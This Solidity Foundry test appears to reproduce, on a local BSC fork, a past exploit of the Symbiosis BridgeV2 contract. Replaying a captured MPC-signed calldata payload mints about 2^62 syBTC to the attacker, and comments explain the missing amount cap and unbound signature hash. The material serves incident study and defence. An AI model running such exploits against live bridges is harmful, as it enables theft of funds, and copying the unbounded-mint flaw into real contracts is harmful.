// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~$336k realized (4.39 WBTC dumped on Ethereum Uni V4). This PoC
// reproduces the BSC-side unbounded syBTC mint (~2^62 raw units, 8 decimals, ~46.12B face).
// Attacker : 0x025122b60470EEe9e7947fbD922FE0d35F5d3Ba2
// Attack Contract : n/a (relayer-submitted signed BridgeV2 receive; beneficiary is a fresh EOA)
// Vulnerable Contract : BridgeV2 proxy 0xb8f275fBf7A959F4BCE59999A2ef122A099e81A8
//                       (impl 0x291a42Bdffe3754EB3c8B69B4d232Fa1d4A46608)
//                       Synthesis 0x6B1bbD301782Ff636601FC594Cd7Bfe74871bFaa
//                       (impl 0x24F6f8EE4af3A1A277ec1648133df87b1B582DD9)
// Token : syBTC 0xA67c48F86Fc6d0176Dca38883CA8153C76a532c7
// Attack Tx : https://bscscan.com/tx/0x9a2bc0ac8112131d664096a66e50e44c3580a2c20b629c963421abf821b9b959
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x291a42bdffe3754eb3c8b69b4d232fa1d4a46608#code
//
// @Analysis
// Twitter Guy : https://x.com/blockaid_/status/2098275381417513149
//
// Root cause: BridgeV2.receiveRequestV2Signed executes arbitrary transmitter calldata
// if an MPC signature over keccak256("receiveRequestV2"||callData||receiveSide||chainid||bridge)
// is valid. There is no amount cap, no BTC inclusion proof, and no consumed-hash nonce
// beyond the caller-chosen externalID inside the payload. Synthesis.metaMintSyntheticTokenBTC
// then mints `amount` syBTC (8 decimals) 1:1, gated only by a sequential BtcSerial counter
// that is also inside the signed struct. The live payload set amount = 2^62 + 330.

address constant ATTACKER = 0x025122b60470EEe9e7947fbD922FE0d35F5d3Ba2;
address constant BRIDGE_V2 = 0xb8f275fBf7A959F4BCE59999A2EF122A099e81A8;
address constant BRIDGE_IMPL = 0x291A42bDFFe3754eb3C8B69b4D232Fa1d4a46608;
address constant SYNTHESIS = 0x6B1bbd301782FF636601fC594Cd7Bfe74871bfaA;
address constant SYNTHESIS_IMPL = 0x24f6f8Ee4Af3a1A277EC1648133df87b1B582dd9;
address constant SYBTC = 0xA67c48F86Fc6d0176Dca38883CA8153C76a532c7;
address constant RELAYER = 0x67f9b3E561383493B3f874fEAE0c53c2cD23851D;
address constant TOKEN_REAL = 0x1DfC1e32d75b3f4Cb2F2B1BCEcAD984E99eeba05;
uint256 constant FORK_BLOCK = 121_198_121; // live mint is in 121,198,122
uint256 constant MINTED_RAW = 4_611_686_018_427_388_234; // 2^62 + 330

interface IBridgeV2 {
    function receiveRequestV2Signed(bytes memory callData, address receiveSide, bytes memory signature) external;
    function mpc() external view returns (address);
    function isTransmitter(address) external view returns (bool);
}

interface ISynthesis {
    function fabric() external view returns (address);
    function paused() external view returns (bool);
    function realToMintSerialBTC(address tokenReal) external view returns (uint64);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8546", FORK_BLOCK);
        fundingToken = SYBTC;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(BRIDGE_V2, "BridgeV2 proxy");
        vm.label(BRIDGE_IMPL, "BridgeV2 impl");
        vm.label(SYNTHESIS, "Synthesis proxy");
        vm.label(SYNTHESIS_IMPL, "Synthesis impl");
        vm.label(SYBTC, "syBTC");
        vm.label(RELAYER, "Live relayer");

        require(BRIDGE_IMPL.code.length > 0, "missing bridge impl");
        require(SYNTHESIS_IMPL.code.length > 0, "missing synthesis impl");
        require(SYBTC.code.length > 0, "missing syBTC");
        require(IBridgeV2(BRIDGE_V2).isTransmitter(SYNTHESIS), "synthesis not transmitter");
        require(!ISynthesis(SYNTHESIS).paused(), "synthesis paused");
    }

    function testExploit() public balanceLog {
        uint256 beforeBal = IERC20(SYBTC).balanceOf(ATTACKER);
        uint8 dec = IERC20(SYBTC).decimals();
        emit log_named_uint("syBTC decimals", dec);
        emit log_named_decimal_uint("Attacker syBTC before", beforeBal, dec);
        emit log_named_address("MPC", IBridgeV2(BRIDGE_V2).mpc());
        emit log_named_uint("mint serial before", ISynthesis(SYNTHESIS).realToMintSerialBTC(TOKEN_REAL));

        SymbiosisBridgeV2SyBtcExploit exploit = new SymbiosisBridgeV2SyBtcExploit();
        exploit.attack();

        uint256 afterBal = IERC20(SYBTC).balanceOf(ATTACKER);
        uint256 minted = afterBal - beforeBal;
        emit log_named_decimal_uint("Attacker syBTC after", afterBal, dec);
        emit log_named_decimal_uint("Minted syBTC (8 decimals)", minted, dec);
        emit log_named_uint("minted raw", minted);

        assertEq(minted, MINTED_RAW, "expected 2^62+330 raw syBTC mint");
        assertGt(minted, 4_000_000_000 * 1e8, "face value should be tens of billions of syBTC");
    }
}

contract SymbiosisBridgeV2SyBtcExploit {
    // Inner call: Synthesis.metaMintSyntheticTokenBTC(MetaMintTransactionBTC)
    // amount = 2^62 + 330, serial = 7923, to = attacker EOA, no follow-up swap.
    bytes private constant INNER_CALLDATA =
        hex"cfd7bc0900000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000014a0000000000000000000000000000000000000000000000000000000000001ef3aae99f924ef508b302ea4cc5eea0d3ebdc943327e0d9d4b9278a76d883e77b8698f814790d49948d299c072fd8238bf3176db16319cccd1cda9aa025f08818810000000000000000000000001dfc1e32d75b3f4cb2f2b1bcecad984e99eeba0500000000000000000000000000000000000000000000000000000000d9b4bef9000000000000000000000000025122b60470eee9e7947fbd922fe0d35f5d3ba20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";

    // MPC ECDSA signature over BridgeV2.getRequestHash(INNER_CALLDATA, SYNTHESIS).
    // The hash does not bind msg.sender, so any EOA can submit this before the
    // externalID / serial is consumed.
    bytes private constant MPC_SIGNATURE =
        hex"334f3eabb70ac7d9dd3e49e9fc036e78c68ccf97599a9f04ab6f304ffe5f6bfa21e0291e2b96bff87322246c0d50f621a1974577d1e19357ba0c63e667bcc1de1b";

    function attack() external {
        IBridgeV2(BRIDGE_V2).receiveRequestV2Signed(INNER_CALLDATA, SYNTHESIS, MPC_SIGNATURE);
    }
}
